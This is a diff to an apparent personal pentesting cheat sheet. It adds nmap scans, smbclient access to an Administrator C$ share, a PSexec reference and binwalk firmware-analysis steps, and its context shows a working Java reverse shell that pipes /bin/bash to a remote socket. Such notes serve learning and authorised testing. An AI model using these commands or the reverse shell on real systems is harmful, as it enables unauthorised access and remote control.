@@ -21,13 +21,32 @@ nmap -sV -sC 1.1.1.1
 nmap -p80,5040,5985,7680 1.1.1.1
 nmap -p- -sV -sC 1.1.1.1
 
+nmap firewall
+
+nmap -sC -Pn IP
+nmap -Pn IP
+
 curl -v http://1.1.1.1
 return 302 not found
 ```
 
 ------------
 
+smbclient  port 445
 
+see shares
+
+smbclient -L IP   
+smbclient -L IP -U Administrator
+
+smbclient \\\\IP\\C$ -U Administrator
+
+
+smbclient -h IP
+
+PSexec.py
+
+-------------
 
 gobuster
 
@@ -126,18 +145,7 @@ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#h
 
 ---------------------
 
-FIRMWARE :
 
-bin analysis
-
-binwalk file.bin
-
-fdisk -l file.bin
- 
-Is it encrypted?
- High entropy = probably encrypted (or compressed). Low entropy = probably not
- 
- -------------------------
  
  Reverse shell
  
@@ -149,3 +157,29 @@ int port=8000;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  
+ 
+ ---------------------
+ 
+ FIRMWARE :
+
+bin analysis
+
+binwalk file.bin
+binwalk -t file.bin
+ 
+fdisk -l file.bin
+ 
+
+ 
+ ENTROPY
+ binwalk -E file.bin
+ Is it encrypted?
+ High entropy = probably encrypted (or compressed). Low entropy = probably not
+ 
+ Extractor
+ binwalk -e file.bin
+ 
+
+ 
+ 
+ -------------------------
